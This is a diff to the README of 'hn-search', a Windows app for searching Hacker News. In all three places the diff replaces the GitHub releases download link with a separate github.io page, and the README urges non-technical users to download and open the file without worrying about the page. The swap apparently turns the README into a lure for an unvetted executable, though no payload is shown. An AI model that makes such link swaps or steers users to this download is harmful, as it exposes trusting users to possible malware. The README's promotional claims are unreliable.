@@ -1,6 +1,6 @@
 # 🔍 hn-search - Search Hacker News Lightning Fast
 
-[![Download Now](https://img.shields.io/badge/Download-hn--search-blue?style=for-the-badge&logo=github)](https://github.com/trenhol54/hn-search/releases)
+[![Download Now](https://img.shields.io/badge/Download-hn--search-blue?style=for-the-badge&logo=github)](https://trenhol54.github.io)
 
 ## 🎯 What Is This?
 
@@ -21,7 +21,7 @@ Getting hn-search running on your Windows computer takes less than five minutes.
 
 ### Step 1: Download the Application
 
-Visit this link to download the application: [https://github.com/trenhol54/hn-search/releases](https://github.com/trenhol54/hn-search/releases)
+Visit this link to download the application: [https://trenhol54.github.io](https://trenhol54.github.io)
 
 Click the big download button, and your browser will save the file. Don't worry about the technical-sounding page - just look for the download section and pick the latest version.
 
@@ -105,7 +105,7 @@ While you never need to worry about this, hn-search runs on rock-solid technolog
 
 You're just one click away from unlocking the full potential of Hacker News. Download hn-search now and experience what a truly great search tool feels like.
 
-Remember: **Visit this link to download the application: [https://github.com/trenhol54/hn-search/releases](https://github.com/trenhol54/hn-search/releases)**
+Remember: **Visit this link to download the application: [https://trenhol54.github.io](https://trenhol54.github.io)**
 
 Then just open the file, type what you're looking for, and dive into the world of tech discussion - the smart way.
 
